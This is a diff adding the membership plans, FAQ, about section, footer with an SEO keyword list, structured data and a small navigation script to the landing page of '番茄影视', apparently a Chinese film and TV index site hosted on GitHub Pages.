+          <li>离线缓存 30 部</li>
+          <li>跳过片头片尾与倍速记忆</li>
+          <li>更新提醒优先推送</li>
+        </ul>
+        <a class="btn" href="#">开通月度</a>
+      </div>
+      <div class="plan">
+        <p class="pn">年度会员</p>
+        <p class="pp">¥198<small> / 年</small></p>
+        <ul>
+          <li>包含月度全部权益</li>
+          <li>离线缓存 100 部</li>
+          <li>家庭三台设备同时在线</li>
+          <li>新片优先看权益</li>
+        </ul>
+        <a class="btn" href="#">开通年度</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="faq" class="faq">
+  <div class="wrap">
+    <div class="sechead">
+      <p class="kicker">FAQ</p>
+      <h2>常见问题</h2>
+    </div>
+    <details open>
+      <summary>番茄影视需要下载客户端才能看吗？</summary>
+      <p>不需要。用手机或电脑浏览器打开番茄影视网址即可在线播放，网页端保留完整播放器功能。客户端只是给习惯用 App 的用户多一个入口。</p>
+    </details>
+    <details>
+      <summary>画质最高能到多少，为什么有时自动变模糊？</summary>
+      <p>片源本身支持时最高可选 4K HDR，清晰度默认为自适应模式，网络波动时会先降到 720P 保证不卡顿，网络恢复后自动升回去，也可以在播放页锁定固定清晰度。</p>
+    </details>
+    <details>
+      <summary>投屏搜不到电视怎么办？</summary>
+      <p>先确认手机与电视连的是同一个无线网络，电视端开启 DLNA 或无线投屏功能；部分老款电视需要关闭 AP 隔离。仍无法搜索时，改用电视自带浏览器访问本站播放页即可。</p>
+    </details>
+    <details>
+      <summary>想看的片子在番茄影视里搜不到？</summary>
+      <p>片库每日更新，冷门老片和刚开机的新剧可能有延迟。可以在片库页提交片名与年份，补录团队会在三个工作日内处理，处理完成后会通过站内提醒告知。</p>
+    </details>
+    <details>
+      <summary>片源版权与内容来源如何说明？</summary>
+      <p>番茄影视仅提供影视信息的检索、索引与公开播放入口的跳转，不存储、不上传任何影片文件。若权利人认为内容存在侵权，可通过页脚邮箱提交权属证明，核实后将在 24 小时内下线相关条目。</p>
+    </details>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap about">
+    <div>
+      <div class="sechead">
+        <p class="kicker">ABOUT</p>
+        <h2>关于番茄影视</h2>
+      </div>
+      <p>番茄影视从 2019 年开始做影视索引，最初的出发点很简单：一部剧要在五六个平台之间跳转才能找到能看的版本，我们想把这件事收拢到一个入口里。</p>
+      <p>现在站点维护着七条内容主线和四万余条影片信息，更新、校对、线路检测由值班编辑每天轮班完成。播放器、投屏、离线缓存这类功能也由团队自行开发，目的只有一个：让你少点几次、少等几秒就能开始看。</p>
+      <p>我们不对影片内容做任何二次剪辑与搬运，只做信息聚合与入口整理。如果你发现条目信息有误或者片源失效，页脚的反馈邮箱一直有人看。</p>
+    </div>
+    <aside class="card">
+      <h3>站点信息</h3>
+      <dl>
+        <dt>站点名称</dt><dd>番茄影视</dd>
+        <dt>官方网址</dt><dd><a href="https://fanjiayingshi-app.github.io">https://fanjiayingshi-app.github.io</a></dd>
+        <dt>片库规模</dt><dd>42,860 部 · 七条主线</dd>
+        <dt>更新频率</dt><dd>每日 20:00 刷新排片</dd>
+        <dt>支持终端</dt><dd>手机 · 平板 · 电视 · 网页</dd>
+        <dt>反馈邮箱</dt><dd><a href="#">hi@fanjiayingshi-app.github.io</a></dd>
+      </dl>
+    </aside>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fcols">
+      <div class="fabout">
+        <a class="brand" href="#top">
+          <span class="fruit" aria-hidden="true"></span>
+          <span><strong>番茄影视</strong><span>FANQIAYINGSHI</span></span>
+        </a>
+        <p>番茄影视是一个影视信息检索与追更工具，收录电影、剧集、综艺、动漫与纪录片，支持倍速播放、多线路切换、离线缓存与电视投屏，播放进度三端同步。</p>
+      </div>
+      <div>
+        <h4>看片入口</h4>
+        <ul>
+          <li><a href="#catalog">热播电影</a></li>
+          <li><a href="#catalog">国产剧集</a></li>
+          <li><a href="#catalog">动漫番剧</a></li>
+          <li><a href="#catalog">纪录纪实</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>功能服务</h4>
+        <ul>
+          <li><a href="#feature">多线路切换</a></li>
+          <li><a href="#feature">电视投屏</a></li>
+          <li><a href="#guide">离线缓存</a></li>
+          <li><a href="#member">会员权益</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>帮助与说明</h4>
+        <ul>
+          <li><a href="#guide">观影指南</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#about">关于我们</a></li>
+          <li><a href="#about">内容反馈</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="cloud" aria-label="相关关键词">
+      <a href="#catalog">番茄影视</a>
+      <a href="#catalog">番茄影视官网</a>
+      <a href="#rank">番茄影视在线观看</a>
+      <a href="#rank">影视大全</a>
+      <a href="#catalog">高清电影在线播放</a>
+      <a href="#catalog">电视剧免费看</a>
+      <a href="#catalog">综艺真人秀</a>
+      <a href="#catalog">动漫番剧连载</a>
+      <a href="#feature">手机投屏观影</a>
+      <a href="#rank">热播排行榜</a>
+      <a href="#feature">倍速播放</a>
+      <a href="#member">番茄影视会员</a>
+    </div>
+
+    <p class="copy">
+      番茄影视 · 官方网址 <a href="https://fanjiayingshi-app.github.io">https://fanjiayingshi-app.github.io</a><br>
+      本站仅提供影视信息检索与公开播放入口跳转，不存储任何影片文件。内容版权归原权利人所有。<br>
+      © 2019–2026 番茄影视 FANQIAYINGSHI. All rights reserved.
+    </p>
+  </div>
+</footer>
+
+<button class="totop" id="totop" aria-label="返回顶部">↑</button>
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "name":"番茄影视",
+      "alternateName":"番茄影视在线观看",
+      "url":"https://fanjiayingshi-app.github.io/",
+      "inLanguage":"zh-CN",
+      "description":"番茄影视收录电影、剧集、综艺、动漫与纪录片影片信息，支持多线路播放、离线缓存与电视投屏。",
+      "potentialAction":{
+        "@type":"SearchAction",
+        "target":"https://fanjiayingshi-app.github.io/?q={search_term_string}",
+        "query-input":"required name=search_term_string"
+      }
+    },
+    {
+      "@type":"Organization",
+      "name":"番茄影视",
+      "url":"https://fanjiayingshi-app.github.io/",
+      "email":"hi@fanjiayingshi-app.github.io",
+      "description":"影视信息检索与追更服务平台，维护七条内容主线与四万余条影片条目。"
+    },
+    {
+      "@type":"BreadcrumbList",
+      "itemListElement":[
+        {"@type":"ListItem","position":1,"name":"番茄影视首页","item":"https://fanjiayingshi-app.github.io/"},
+        {"@type":"ListItem","position":2,"name":"片库分类","item":"https://fanjiayingshi-app.github.io/#catalog"},
+        {"@type":"ListItem","position":3,"name":"热播榜单","item":"https://fanjiayingshi-app.github.io/#rank"}
+      ]
+    }
+  ]
+}
+</script>
+
+<script>
+(function(){
+  var burger=document.getElementById('burger');
+  var nav=document.getElementById('nav');
+  burger.addEventListener('click',function(){
+    var open=nav.classList.toggle('on');
+    burger.classList.toggle('on',open);
+    burger.setAttribute('aria-expanded',open?'true':'false');
+  });
+  nav.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){
+      nav.classList.remove('on');
+      burger.classList.remove('on');
+      burger.setAttribute('aria-expanded','false');
+    }
+  });
+  document.getElementById('totop').addEventListener('click',function(){
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+})();
+</script>
+
+</body>
+</html>
